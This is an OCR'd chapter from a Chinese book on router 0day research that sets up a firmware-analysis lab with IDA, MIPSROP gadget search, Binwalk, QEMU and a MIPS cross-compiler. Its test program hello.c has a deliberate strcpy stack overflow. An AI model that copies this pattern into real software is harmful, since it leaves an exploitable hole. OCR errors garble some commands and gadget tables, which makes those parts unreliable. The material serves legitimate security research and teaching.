下载好安装程序以后，双击安装程序开始安装，选择安装类型为“Typical”，然后单击“Next”按钮，如图 2-1 所示。在选择安装目录时，可以使用默认的安装目录，也可以通过“Change”按钮进行自定义。根据实际需要设置各选项，单击“Continue”按钮，开始安装。

安装完成后，输入正确的密钥，单击“Enter”按钮，如图 2-2 所示。

至此，VMware 的安装全部完成。

##### 揭秘家用路由器 0day 漏洞挖掘技术

 </div>

 </div>

# 2. 安装Ubuntu 12.04虚拟机

我们需要使用的分析软件（如 Binwalk、QEMU 等）都要运行在 Linux 系统环境下，因此，下面使用 VMware 建立一个 Ubuntu 的 Linux 分析环境。

在安装虚拟机之前，需要下载 Ubuntu 12.04 的安装镜像文件。

打开 VMware 虚拟机，依次单击虚拟机菜单栏中的 “File” → “New Virtual Machine” 选项，打开新建虚拟机系统的向导，如图 2-3 所示，在这里选中 “Custom” 选项。

选择下载的 Ubuntu 安装镜像，然后单击 “Next” 按钮，如图 2-4 所示。

 </div>

 </div>

输入管理这台 Ubuntu 虚拟机的用户名、密码等信息，单击 “Next” 按钮，如图 2-5 所示。

选择 Ubuntu 系统的安装位置。在这里尽量选择空闲存储空间较大的分区，因为随着系统的使用，占用的空间会逐渐增大。选择使用 1 个处理器和 2 个内核，而虚拟机使用的内存空间大小根据主机系统的性能进行设置，这里使用默认设置即可。设置网络类型为 NAT 网络，那么虚拟机会使用 DHCP 自动为虚拟系统分配 IP 地址。

揭秘家用路由器 0day 漏洞挖掘技术

 </div>

在接下来的界面中单击 “Next” 按钮。如图 2-6 所示，在指定虚拟磁盘空间的界面中，建议将磁盘空间设置为 40GB。继续单击 “Next” 按钮，最后单击 “Finish” 按钮，会启动虚拟机，开始自动安装和配置 Ubuntu 系统。

 </div>

待虚拟机安装的 Ubuntu 系统自动完成，输入登录密码就可以正常使用了，如图 2-7 所示。

 </div>

Ubuntu 系统安装好以后，我们可以使用建立快照的方式备份这个 Ubuntu 系统当前的状态。如果在今后的使用过程中发生任何问题，我们都可以通过快照还原系统。

依次单击虚拟机菜单栏中的 “VM” → “Snapshot” → “Take Snapshot” 选项，建立一个快照，如图 2-8 所示。

给建立的快照取一个名字，如 “new machine”。建立快照以后，如果要恢复到 “new machine” 的状态，可以依次单击虚拟机菜单栏中的 “VM” → “Snapshot” → “Take Snapshot” 选项，如图 2-9 所示。当然，恢复到 “new machine” 会丢失 “new machine” 状态以后的所有数据，因此，恢复前要考虑清楚，并把重要数据备份。

##### 揭秘家用路由器 Oday 漏洞挖掘技术

 </div>

 </div>

#### 2.1.2 Python的安装

Python 是一种面向对象的、解释型的计算机程序设计语言，语法简洁、清晰，具有丰富和强大的类库，应用十分广泛。

Python 的安装过程并不复杂，下面分别讲解 Windows 和 Linux 下的安装。

在 Windows 系统下安装 Python 时，要访问 http://www.python.org/downloads/windows 下载 Python 2.7 安装程序，如图 2-10 所示。

安装过程甲除了安装路径以外，都直接单击“下一步”按钮就可以完成，因此不再详述。安装完成以后，打开安装目录，如图 2-11 所示。

运行 python.exe，打开 Python 控制台，输入 “print 'hello python'”，如图 2-12 所示，就完成了 Python 的整个安装过程。

 </div>

 </div>

 </div>

在 Ubuntu 中，如果需要安装 Python 2.7，可以使用如下命令。

$ sudo apt-get install python2.7

以上命令的运行结果如图 2-13 所示。

 </div>

可以看出，在我们刚安装好的 Ubuntu 系统中，已经默认安装了 Python 2.7，直接运行命令 “python” 就可以使用了。

#### 2.1.3 在Linux下安装IDA Pro

IDA Pro 是一个世界顶级的交互式反汇编工具，它的使用者包括软件安全专家、军事工业从业人员、逆向工程研究者、学者等。IDA 有两种可用版本：标准版（Standard）支持 20 多种处理器；高级版（Advanced）支持 50 多种处理器，支持多种处理器平台应用程序的反汇编，还支持多种调试功能，是路由器安全研究中不可或缺的工具之一。

从路由器的固件提取出的根文件系统中有符号链接，为了避免在虚拟机和实体机（这里是 Windows 主机）之间进行烦琐的复制操作，以及复制到 Windows 之后会造成符号链接丢失等问题，我们将 IDA 移植到 Ubuntu 上运行。

要想在 Ubuntu 中运行 IDA Pro，就需要在 Ubuntu 系统中安装一个叫做 Wine 的模拟器软件。Wine 是一款优秀的 Linux 系统平台下的模拟器软件，用于使 Windows 系统下的软件在 Linux 系统下稳定运行。该软件更新频繁，日臻完善，可以运行许多 Windows 系统下的大型软件。接下来，我们介绍如何在 Linux 下安装并运行 IDA Pro。

01 在控制台执行 apt-get 安装 Wine 的命令如下。

embedded@ubuntu:~$ sudo apt-get install wine

如果在安装的过程中遇到依赖问题，请先安装依赖文件。例如，笔者在安装时缺少 gnome-control-center 依赖，因此使用 apt-get 命令安装依赖即可，示例如下。

$ sudo apt-get install gnome-control-center

安装依赖后，再次执行 Wine 安装命令即可安装完成。

02 复制 Windows 的 IDA Pro 目录下的所有文件到 Linux 系统的 /opt/ida61 目录下。

03 编写一个启动脚本，快速启动 IDA Pro。

为了让 Wine 快速启动 IDA Pro，可以将如下启动脚本放在用户目录下。每次运行 IDA Pro 时，只需要运行该脚本即可。

IDA 启动脚本 ~/ida.sh 示例如下。

#!/bin/sh
wine /opt/ida61/idag.exe

04 使用如下命令启动 IDA Pro。

embedded@ubuntu:~$ sh ida.sh

使用 Wine 模拟运行 IDA 与在 Windows 下相同，但是在 Ubuntu 下运行时可能会缺少 DLL 文件。如果出现这样的问题，请自行在 Windows 系统中找到动态库，或者下载以后将其复制到 IDA Pro 根目录下。

运行 IDA Pro 时报告的错误如图 2-14 所示。

 </div>

下载 CC3260MT.DLL，将其放入 IDA 主目录（/opt/ida61）就可以排除这个错误。成功运行 IDA 以后，如图 2-15 所示，表示安装成功。

 </div>

#### 2.1.4 IDA的MIPS插件和脚本

下面将要介绍的 IDA 插件就是基于 MIPS 架构的分析辅助插件。

1. IDA插件和脚本的安装

01 下载 IDA 插件和脚本，示例如下。

embedded@ubuntu:~$ git clone https://github.com/devttys0/ida.git

02 将下载的 ida/plugins 目录下所有后缀为 ".py" 的文件复制到 IDA Pro 插件目录 /opt /ida61/plugins 下，示例如下。

embedded@ubuntu:~$ sudo cp -r `find ~/ida/plugins -iname *.py` /opt/ida61/plugins/

03 将 script 复制到 IDA Pro 根目录下，示例如下。

embedded@ubuntu:~$ sudo mkdir /opt/ida61/plugins/scripts
embedded@ubuntu:~$ sudo cp -r ida/scripts /opt/ida61/scripts/

完成以上的步骤以后，如果在 IDA 界面中依次单击 “Edit” → “Plugins” 选项后可以看到存在如图 2-16 所示的插件，那么之前介绍的 IDA 插件和脚本就安装完成了。

 </div>

# 2. IDA插件的功能

这些 IDA 插件的功能和使用方法在安装 IDA 插件的目录中都有详细的介绍，这里仅以 MIPSROP 插件为例讲解。

MIPSROP 的功能是在编写 exploit 时从 MIPS 执行代码中搜索适合的 ROP 链。运行 MIPSROP，如图 2-17 所示。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td colspan="2">Search View Debugger Options</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>next code</td><td style='text-align: center; word-wrap: break-word;'>Alt+C</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>next data</td><td style='text-align: center; word-wrap: break-word;'>Ctrl+D</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>next explored</td><td style='text-align: center; word-wrap: break-word;'>Ctrl+A</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>next unexplored</td><td style='text-align: center; word-wrap: break-word;'>Ctrl+U</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>immediate value...</td><td style='text-align: center; word-wrap: break-word;'>Alt+I</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>next immediate value</td><td style='text-align: center; word-wrap: break-word;'>Ctrl+I</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>text._</td><td style='text-align: center; word-wrap: break-word;'>Alt+T</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>next text</td><td style='text-align: center; word-wrap: break-word;'>Ctrl+T</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sequence of bytes...</td><td style='text-align: center; word-wrap: break-word;'>Alt+B</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>next sequence of bytes</td><td style='text-align: center; word-wrap: break-word;'>Ctrl+B</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>not function</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>next void</td><td style='text-align: center; word-wrap: break-word;'>Ctrl+V</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>error operand</td><td style='text-align: center; word-wrap: break-word;'>Ctrl+F</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>all void operands</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>all error operands</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>search direction</td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

 </div>

运行 MIPSROP 之后，可以用以下几种内建方法搜索 ROP 链。

搜索将堆栈地址存入 \$a0 的 ROP 链指令，如图 2-18 所示。

Python>하였:find("addiu $a0, $sp, .*")

Address | Action | Control Jump
--- | --- | ---
0x0001C2BC | addiu $a0, $sp, 0x18 | jaiz $a0
0xC001A304 | addiu $a0, $sp, 0xA0+var_66 | jz 0xA0+var_8($sp)
0x0001A5E8 | addiu $a0, $sp, 0x50+var_38 | jr 0x50+var_4($sp)
0x0001C28C | addiu $a0, $sp, 0x18 | jr 0x30($sp)
0xC001E3BC | addiu $a0, $sp, 0x23+var_10 | jr 0x28+var_8($sp)
0xC001E588 | addiu $a0, $sp, 0x28+var_10 | jr 0x28+var_8($sp)
0x00022620 | addiu $a0, $sp, 0x30+var_18 | jr 0x30+var_8($sp)
0x00035ADE | addiu $a0, $sp, 0x20+arg_0 | jr 0x20+var_8($sp)
0x00038AF4 | addiu $a0, $sp, 0xA5+var_90 | jr 0xA8+var_8($sp)
0x00040168 | addiu $a0, $sp, 0x90+var_78 | jr 0x90+var_8($sp)
0x00042098 | addiu $a0, $sp, 0x90+var_78 | jr 0x90+var_4($sp)
0xC0042272 | addiu $a0, $sp, 0x90+var_78 | jr 0x90+var_4($sp)
0xC004DA1C | addiu $a0, $sp, 0xA0+var_88 | jr 0xA0+var_4($sp)

Found 13 matching gadgets

Python | mipsrop.find("addiu $a0, $sp,.*")

 </div>

从当前 IDB 数据库中标记完整的、可使用的 ROP 链，如图 2-19 所示。

Python.mipsrop.summary()

Gadget Name | Gadget Offset | Gadget Summary

ROP1 | 0x00038A08 | move $ga0, $zero | Sets up the argument to alarm()
| | 1w $ra, 0x15($sp) | Address of ROP2 is loaded into $ra from the stack
| | move $v0, $a0 | Jump to $ra
| | $r | addiu $sp, 0x20 |

ROP2 | 0x0001A864 | move $t9, $s1 | St9 = $s1 ($s1 == address of alarm)
| | 1w $ra, 0x20($sp) | Load address of ROP3 from the stack into $ra
| | 1w $s1, 0x1C($sp) | Jump to alarm()
| | 1w $s0, 0x1B($sp) |

Python mipsrop.summary()

 </div>

使用 mipsrop.help() 函数查看使用帮助，如图 2-20 所示。

Output window
Python>mipsrop.help()

mipsrop.find(instruction_string)

Locates all potential ROP gadgets that contain the specified instruction.
Python mipsrop.help()
AU: idle Up Disk: 13GB

图2-20

## 2.2 路由器漏洞分析环境

本书中路由器的分析环境是建立在 Ubuntu 12.04 基础之上的，因此，在安装以下必备工具之前，需要确保已按照前面介绍的方法正确安装了 Ubuntu 12.04。在搭建环境的过程中，要注意保存虚拟机快照，以便快速恢复和启动。

#### 2.2.1 固件分析利器Binwalk的安装

Binwalk 是一款十分强大的固件分析工具，不仅可以用于提取文件系统，而且可以用于协助研究人员对固件进行分析及逆向工程等。它的源码在 Github 上，安装方法可以参考 https://github.com/devttys0/binwalk/wiki/Quick-Start-Guide。

# 01 安装 git 工具，代码如下。

embedded@ubuntu:/opt$ sudo apt-get update
embedded@ubuntu:/opt$ sudo apt-get install build-essential autoconf git

# 02 下载 Binwalk，代码如下。

embedded@ubuntu:/opt$ sudo git clone https://github.com/devttys0/binwalk.git
Cloning into 'binwalk'...
remote: Counting objects: 4645, done.
remote: Compressing objects: 100% (109/109), done.
remote: Total 4645 (delta 52), reused 0 (delta 0)
Receiving objects: 100% (4645/4645), 6.38 MiB | 55 KiB/s, done.
Resolving deltas: 100% (2580/2580), done.

03 根据 Binwalk 中的 INSTALL.md 安装可选运行依赖文件。

首先，安装图像模块依赖包，代码如下。

$ sudo apt-get install libqt4-openg1 python-openg1 python-qt4 python-qt4-gl python-numpy python-كىپى python-pip
$ sudo pip install pyqtgraph

安装 capstone 反汇编引擎。这个汇编引擎，笔者在安装时无法访问，搜索了一下，发现了另外一个链接 http://capstone-engine.org/download/2.1.2/capstone-2.1.2.tar.gz，因此，在这里使用它进行安装，代码如下。

$ sudo wget http://capstone-engine.org/download/2.1.2/capstone-2.1.2.tar.gz

揭秘家用路由器 0day 漏洞挖掘技术

$ sudo tar -zxvf capstone-2.1.2.tar.gz
$ (cd capstone-2.1.2 && sudo ./make.sh && sudo make install)
$ (cd capstone-2.1.2/bindings/python && sudo python ./setup.py install)

接下来，安装固件提取组件。由于在 apt 资源库中找不到 lhasa，因此这里需要向 /etc/apt /source.list 目录中添加一个资源，代码如下。

$ sudo nano /etc/apt/sources.list

在打开的 source.list 文件的尾部添加 “deb http://us.archive.ubuntu.com/ubuntu saucy main universe”，保存并退出，然后更新资源，代码如下。

$ sudo apt-get update

下面就可以开始安装组件了，代码如下。

$ sudo apt-get install mtd-utils zlib1g-dev liblzma-dev gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract openjdk-6-jdk cramfsprogs cramfsswap squashfs-tools

最后，安装 sasquatch SquashFS 提取工具，代码如下。

$ sudo apt-get install zliblg-dev liblzma-dev liblzo2-dev
$ sudo git clone https://github.com/devttys0/sasquatch
$ (cd sasquatch && sudo make && sudo make install)

04 安装 Binwalk，代码如下。

embedded@ubuntu:/opt/binwalk$ sudo python setup.py install

通过以上 4 个步骤完成了 Binwalk 的安装。接下来需要测试一下 Binwalk 能否正常工作。

将 firmware.bin 复制到用户目录下，使用 Binwalk 提取文件系统，命令如图 2-21 所示。可以看到，我们已经提取了固件 firmware.bin 的分析信息，并成功提取了 firmware.bin 中的文件系统。到这里，Binwalk 的安装就完成了。

#### 2.2.2 Binwalk的基本命令

Binwalk 是一款十分强大的固件分析工具，旨在协助研究人员对固件进行分析，从固件镜像文件中提取数据及进行逆向工程。该工具简单易用，脚本完全自动化。很重要的一点是该工具由 Python 编写，并可以通过自定义签名提取规则和插件模块轻松实现扩展。目前，Binwalk 仅支持在 Linux 系统上运行。

 </div>

Binwalk 的基础用法介绍如下。

##### (1) 获取帮助

获取 Binwalk 帮助信息的选项为 “-h” 和 “--help”，示例如下。

$ binwalk -h
$ binwalk --help

##### (2) 固件扫描

对固件进行自动扫描，示例如下。

$ binwalk firmware.bin

##### (3) 提取文件

选项“-e”和“--extract”按照预定义的配置文件中的提取方法从固件中提取探测到的文件及系统，示例如下。

$ binwalk -e firmware.bin

选项 “-M” 和 “--matryoshka” 根据 magic 签名扫描结果进行递归提取，仅对 “-e” 和 “-dd” 选项有效，示例如下。

$ binwalk -Me firmware.bin

选项“-d”和“--depth=<int>”用于限制递归提取的深度，默认深度为8，仅当“-M”选项存在时有效，示例如下。

$ binwalk -Me -d 5 firmware:bin

选项 “-D” 和 “--dd=<type:ext[:cmd]>” 示例如下。

$ binwalk --dd 'zip archive:zip:unzip %e' firmware.bin

##### (4) 过滤选项

选项“-y”和“--include=<filter>”只包含与签名相匹配的指定过滤器。过滤器是小写字母的正则表达式，可以指定多个过滤器，只有第一行匹配指定的过滤器的 magic 签名才会被加载。因此，这个过滤器的使用可以帮助减少签名的扫描时间，在搜索特定的签名或特定类型的签名时很有用。

$ binwalk -y filesystem firmware.bin # only search for filesystem signatures

选项 “-x” 和 “--exclude=<filter>” 与选项 “-y” 的作用相反，第一行用于匹配指定的过滤器的 magic 签名不会被加载，其他意义相同。该选项主要用于排除不必要的或无趣的结果，示例如下。

$ binwalk -x 'mach-o' -x '^hp' firmware.bin # exclude HP calculator and OSX mach-o signatures

##### (5) 显示完整的扫描结果

选项 “-I” 和 “--invalid” 用于显示所有的扫描结果，包括扫描过程中被定义为 “invalid” 的项，示例如下。当我们觉得 Binwalk 错把有效文件当成无效文件时使用，这会产生很多无用信息。

$ binwalk -I firmware.bin

##### (6) 文件比较

选项 “-W” 和 “--hexdump” 对给定的文件进行字节比较，可以指定多个文件，这些文件的比较结果会按 hexdump 方式显示，绿色表示在所有文件中这些字节都是相同的，红色表示在所有文件中这些字节都是不同的，蓝色表示这些字节仅在某些文件中是不同的。该选项可以与 “--block”、“--length”、“--offset” 及 “--terse” 选项一起使用，示例如下。

$ binwalk -W firmware1.bin firmware2.bin firmware3.bin
$ binwalk -W --block=8 --length=64 firmware1.bin firmware2.bin

##### (7) 日志记录

选项“-f”和“--log=<file>”用于将扫描结果保存到一个指定的文件中，示例如下。如果不与“-q”和“--quit”选项合用，会同时在 stdout 和文件中输出。保存 CSV 格式的 log 文件时使用“--csv”选项。

$ binwalk -f binwalk.log -q firmware.bin
$ binwalk -f binwalk.log --csv firmware.bin

##### (8) 指令系统分析

选项 “-A” 和 “--opcodes” 用于扫描指定文件中通用 CPU 架构的可执行代码，示例如下。由于某些操作码签名比较短，因此比较容易造成误判。如果需要确定一个可执行文件的 CPU 架构，可以使用该命令。

$ binwalk -A firmware.bin

##### (9) 熵分析

选项 “-E” 和 “--entropy” 用于对输入文件执行熵分析，打印原始数据并生成熵图，与 “--signature”、“--raw” 及 “--opcodes” 选项合用，对分析更有利，示例如下。

$ binwalk -E firmware.bin

对签名扫描无效的文件，使用熵分析识别一些有趣的数据块也是很有用的。

(10) 启发式

选项 “-H” 和 “--heuristic” 用于对输入文件进行启发式分析，判断得到的熵值分类数据块是压缩的还是加密的，可以与 “--entropy” 选项一起使用，对未知的高熵数据分类比较有用，示例如下。

$ binwalk -H firmware.bin

#### 2.2.3 QEMU和MIPS

本节详细介绍 QEMU 和 MIPS 的相关内容。

# 1. QEMU的安装

QEMU 是由 Fabrice Bellard 编写的模拟处理器自由软件。它与 Bochs 和 PearPC 近似，但具有后两者所不具备的一些特性，如高速度及跨平台的特性。经由 KQEMU 这个闭源的加速器，QEMU 能模拟接近真实计算机的速度，其安装过程如下。

01 获取 QEMU 资源，示例如下。

$ git clone git://git.qemu-project.org/qemu.git
embedded@ubuntu: /opt/qemu$ git submodule update --init pixman
embedded@ubuntu: /opt/qemu$ git submodule update --init dtc

02 安装依赖文件，示例如下。

$ sudo apt-get install libglib2.0 libglib2.0-dev
$ sudo apt-get install autoconf automake libtool

03 修改 QEMU 源文件。

如果使用的是低版本的 QEMU，那么在运行一个 MIPS 程序时，可能会遇到不论是使用大端格式的 qemu-mips 还是小端格式的 qemu-mipsel 都会报告如下错误的情况。

embedded@ubuntu:~/firmware$ sudo chroot . ./qemu-mipsel bin/ls bin/ls: Invalid ELF image for this architecture

这时需要先修改 QEMU 的源文件，示例如下。

embedded@ubuntu:/opt/gemu/linux-user$ sudo nano elfload.c

将如下行注释掉，修改以后的文件如下。

static bool elf_check_ehdr(struct elfhdr *ehdr)
{
    return (elf_check_arch(ehdr->e_machine)
&& ehdr->e_ehsize == sizeof(struct elfhdr)
&& ehdr->e_phentsize == sizeof(struct elf_phdr)
//&& ehdr->e_shentsize == sizeof(struct elf_shdr) //commenting out this
line and recompiling did the trick
&& (ehdr->e_type == ET_EXEC || ehdr->e_type == ET_DYN));
}

修改方式为将第 6 行代码改为注释。

04 编译 QEMU 并安装，示例如下。

embedded@ubuntu:/opt/gemu$ sudo ./configure --static&amp;&amp;sudo make && sudo make install

如果在运行编译命令时出现了编译库，请使用 apt-get 自行安装。例如，在安装过程中报告了如下错误。

ERROR: glib-2.12 gthread-2.0 is required to compile QEMU

出现该错误提示的原因是系统中缺少 QEMU 编译需要的 glib 库，因此通过如下命令安装。

embedded@ubuntu: /opt/qemu$ sudo apt-get install libglib2.0-dev

安装缺失的库以后，重新使用编译命令进行编译，示例如下。

05 运行测试 QEMU。使用通过 Binwalk 提取的文件系统 “_firmware.bin. extracted”，执行如下命令。

1 embedded@ubuntu:~/_firmware.bin.extracted/squashfs-root$ cp $(which qemu-mipsel) ./
2 embedded@ubuntu:~/_firmware.bin.extracted/squashfs-root$ ./qemu-mipsel bin/ls
3 qemu-mips www home tmp dev var
4 proc bin sys mnt lib usr
5 qemu-mipsel include etc htdocs sbin

从执行结果看，QEMU 已经成功安装并运行。

# 2. MIPS交叉编译环境

为了在 x86 平台的虚拟机中编译 MIPS 架构的应用程序，需要在 Ubuntu 下建立交叉编译环境。编译过程中，会下载一些依赖包，所以必须在安装过程确保网络通畅。

##### (1) 下载Buildroot

下载 Buildroot，示例如下。

wget http://buildroot.uclibc.org/downloads/snapshots/buildroot-snapshot.tar.bz2
tar -jxvf buildroot-snapshot.tar.bz2

##### (2) 配置Buildroot

配置 Buildroot 的命令如下。

cd buildroot
sudo apt-get install libncurses5-dev patch
make clean
make menuconfig

出现配置界面以后，需要修改以下 3 个地方。

将 “Target Architecture” 改成 “MIPS(little endian)”。如果开发板 CPU 是 AR9132，那么应该是属于小端的。其实，最后生成的编译器在编译程序时可以添加选项供用户设置大端或者小端。

将 “Target Architecture Variant” 改成 “mips 32”。
Toolchain，将 “Kernel Headers” 改成机器环境的 Kernel 版本，笔者的机器是 3.2.x 版。按照上面的选项配置以后，输入 “./config” 命令保存配置。

##### (3) 编译

当笔者使用如下命令进行编译时，出现了错误提示。

embedded@ubuntu:/opt/buildroot$ sudo make
package/ffmpeg/ffmpeg.mk:345: Extraneous text after `else' directive
package/ffmpeg/ffmpeg.mk:370: *** missing `endif'. Stop.

按照如下方式即可解决。

embedded@ubuntu:/opt/buildroot$ sudo nano package/ffmpeg/ffmpeg.mk

在文件末尾添加 “endif”，如图 2-22 所示。

Save modified buffer (ANSWERING "NO" WEIL DESTROY (CHANGES))

embedded(ubuntu:/opt/buildroot$ sudo nano package/ffimpeg/ffimpeg.mk
(GNU nano 2-2.6)

--target-cs="linux" \
--disable-stripping \
--pkg-config="$(PKG_CONFIG_HOST_BINARY)" \
$(SHARED_STATIC_LIBS_OPTS) \
$(FFMPEG_CONF_OPTS) \

endef

$(eval $(autotools-package))

endif

 </div>

使用下面的命令开始编译。

embedded@ubuntu:/opt/buildroot$ sudo make

经过超过 1 小时的等待，编译完成后，在 buildroot 目录下会新增一个 output 文件夹，其中包含编译好的文件。可以在 buildroot/output/host/usr/bin 目录下找到生成的交叉编译工具，编译器是该目录下的 mips-linux-gcc 文件。

可以通过如下命令查看版本信息。

embedded@ubuntu: /opt/mips/output/host/usr/bin$ ./mips-linux-gcc --version
mips-linux-gcc (Buildroot 2014.05-git) 4.7.3
Copyright (C) 2012 Free Software Foundation, Inc.
This is free software; see the source for copying conditions. There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

##### (4) 测试交叉编译环境

完成交叉环境的编译以后，我们通过编译如下代码进行测试。

##### 源码 hello.c

#include <stdio.h>
int vul(char *src)
{
    char output[20] = {0};
    strcpy(output, src);
    printf("%s\\n", output);
    return 0;
}
int main(int argc, char *argv[])
{
    if (argc < 2)
    {
        printf("need more arguments\\n");
        return 1;
    }
    vul(argv[1]);
    return 0;
}

运行编译命令，为了让生成的二进制程序 hello 不依赖动态库，在编译选项中加入 “-static”，示例如下。

embedded@ubuntu:~$ mips-linux-gcc -o hello hello.c -static
embedded@ubuntu:~$ ls hello*
hello hello.c

编译完成后，使用 file 命令查看编译后的程序，hello 文件类型如下。

embedded@ubuntu:~$ file hello
hello: ELF 32-bit MSB executable, MIPS, MIPS32 version 1 (SYSV),
statically linked, with unknown capability 0x41000000 = 0xf676e75, with
unknown capability 0x10000 = 0x70403, not stripped

可以看到，我们已经使用搭建的交叉编译环境将 hello.c 编译成 MIPS 指令架构的可执行程序 hello。接下来，使用 QEMU 运行 hello，示例如下。

embedded@ubuntu:~$ gemu-mips hello "Hello World"
Hello World

至此，就完成了 MIPS 交叉编译环境的安装和测试。

# 3. QEMU的基本使用方法

QEMU 有主要如下两种运作模式。

模拟模式（User Mode），亦称使用者模式。QEMU 能启动那些为不同中央处理器编译的 Linux 程序。

模拟模式（System Mode），亦称系统模式。QEMU 能模拟整个计算机系统，包括中央处理器及其他周边设备，它使为跨平台编写的程序进行测试及排错工作变得容易。其亦能用来在一部主机上虚拟数个不同的虚拟计算机，类似我们平常使用的 VMware、VirtualBox 等。

##### （1）在使用者模式下执行程序

QEMU 使用者模式 MIPS 程序共有两种模拟程序，分别是运行大端机格式的 QEMU-MIPS 和小端机格式的模拟执行程序 QEMU-MIPSSEL，它们的执行参数都是一样的。

下面介绍常用的参数。

使用者模式的命令格式为“quemu-mipsel [options] program [arguments...]”、“quemu-mips [options] program [arguments...]”。其中，“program”是需要 QEMU 运行的其他处理器编译的程序，“arguments”是“program”的参数，“options”是 QEMU-MIPS 或 QEMU-MIPSEL

的选项，选项格式如表 2-1 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>选项</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-E var=value</td><td style='text-align: center; word-wrap: break-word;'>为program进程设置环境变量</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-g port</td><td style='text-align: center; word-wrap: break-word;'>QEMU开启调试模式，等待GDB连接PORT</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>LD_PRELOAD=newlib</td><td style='text-align: center; word-wrap: break-word;'>使用新的动态库newlib劫持系统调用</td></tr></table>

在使用 QEMU 的用户模式执行其他处理器编译的 Linux 程序时，一般执行如下命令即可（不依赖动态库）。

1 root@root:~/book-source/1$ cp $(which gemu-mipsel) ./
2 root@root:~/book-source/1$ ./gemu-mipsel hello "just test"
3 just test

第 1 行：将小端机格式的 QEMU-MIPSEL 复制到当前 ~/book-source/1 目录下。

第 2 行：使用 QEMU-MIPSEL 加载小端格式的 MIPS 程序 hello 并运行，hello 程序的运行参数为 “just test”。

第 3 行：QEMU 使用者模式执行二进制程序 hello 的运行结果 “just test”。

在 QEMU 使用者模式下，如果 program 需要依赖动态链接库，应该如何运行 QEMU 呢？只需要使用如下命令即可。

root@root:~/book-source/1/needlibc$ mips-linux-gcc -o hello hello.c
root@root:~/book-source/1/needlibc$ cp $(which gemu-mits) ./
root@root:~/book-source/1/needlibc$ ls -l
total 2272
-rwxrwxr-x 1 root root 6201 Nov 7 10:12 hello
-rw-rw-r-- 1 root root 143 Nov 7 10:08 hello.c
drwxrwxr-x 2 root root 4096 Aug 7 14:30 lib
-rwxr-xr-x 1 root root 2309100 Nov 7 10:12 gemu-mits
root@root:~/book-source/1/needlibc$ ./gemu-mits hello "just test"
/lib/ld-uClibc.so.0: No such file or directory
root@root:~/book-source/1/needlibc$ sudo chroot . ./gemu-mits hello
"just test"
just test

第 1 行：使用大端格式的 GCC 编译器编译源码 hello.c，去掉 “-static” 选项，采用动态库运行。

第 2 行：将使用者模式大端机模拟运行程序 QEMU-MIPS 复制到当前目录。

第 7 行：该目录中已存在当前交叉编译环境 GCC 需要的 GCC 的 lib 库文件目录。

第 9 行：直接执行 hello 程序，第 10 行提示缺少链接库文件，原因在于 hello 程序执行时使用系统环境变量库的路径是 /lib，而 /lib 路径下并没有程序需要的库，因此需要使用 chroot 命令更改程序执行根目录。

第 11 行：使用 chroot 命令更改 QEMU-MIPS 执行的根目录到当前目录 ~/book-source /1/needlibc，此时，hello 依赖的库已经能够找到了。

第 12 行：输出执行结果。

##### (2) 系统模式

系统模式命令的格式为 “$ qemu-system-mits [options] [disk_image]”。 “disk_image” 是一个原始的 IDE 硬盘镜像，常用的选项如表 2-2 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>选项</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-kernel bzImage</td><td style='text-align: center; word-wrap: break-word;'>使用“bzImage”作为内核镜像</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-hda/-hdb file</td><td style='text-align: center; word-wrap: break-word;'>使用“file”作为IDE硬盘0/1镜像</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-append cmdline</td><td style='text-align: center; word-wrap: break-word;'>使用“cmdline”作为内核命令行</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-nographic</td><td style='text-align: center; word-wrap: break-word;'>禁用图形输出，重定向串行I/O到控制台</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-initrd file</td><td style='text-align: center; word-wrap: break-word;'>使用“file”作为初始化的RAM磁盘</td></tr></table>

使用 QEMU-SYSTEM-MIPS 启动 MIPS 虚拟机，其内核为 vmlinux-3.2.0-4-4kc-malta，磁盘镜像为 debian_wheezy_mips_standard.qcow2，命令如下。

$ sudo gemu-system-mips -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mips_standard.qcow2 -append "root=/dev/sda1 console=ttyS0" -nographic

# 4. MIPS系统网络的配置

下面我们使用 QEMU 模拟正在运行的 MIPS 系统，并配置 MIPS 系统网络。

01 获取安装依赖文件，示例如下。

$ sudo apt-get install uml-utilities bridge-utils

02 修改 Ubuntu 主机网络配置。将 Ubuntu 系统中的网络接口配置文件 /etc/network /interfaces 修改为如下内容并保存。

1 auto lo
2 iface lo inet loopback
3 auto eth0
4 iface eth0 inet dhcp
5 #auto br0
6 iface br0 inet dhcp
7 bridge ports eth0
8 bridge_maxwait 0

